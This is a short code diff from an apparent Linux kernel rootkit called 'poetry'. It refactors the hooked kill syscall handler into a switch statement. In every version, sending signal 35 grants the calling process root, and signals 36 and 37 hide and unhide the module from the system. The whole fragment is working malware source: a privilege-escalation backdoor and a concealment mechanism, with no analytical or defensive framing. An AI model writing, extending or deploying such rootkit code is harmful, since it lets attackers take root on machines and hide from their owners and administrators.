@@ -42,20 +42,17 @@ asmlinkage int hook_kill(const struct pt_regs *regs)
 
     int sig = regs->si;
 
-    if ( sig == 35 )
+    switch (sig)
     {
+    case 35:
         printk(KERN_INFO "poetry: giving root\n");
         set_root();
         return 0;
-    } 
-    else if ( sig == 36 ) 
-    {
+    case 36:
         printk(KERN_INFO "poetry: hiding\n");
         hideme();
         return 0;
-    }
-    else if ( sig == 37 ) 
-    {
+    case 37:
         printk(KERN_INFO "poetry: unhiding\n");
         showme();
         return 0;
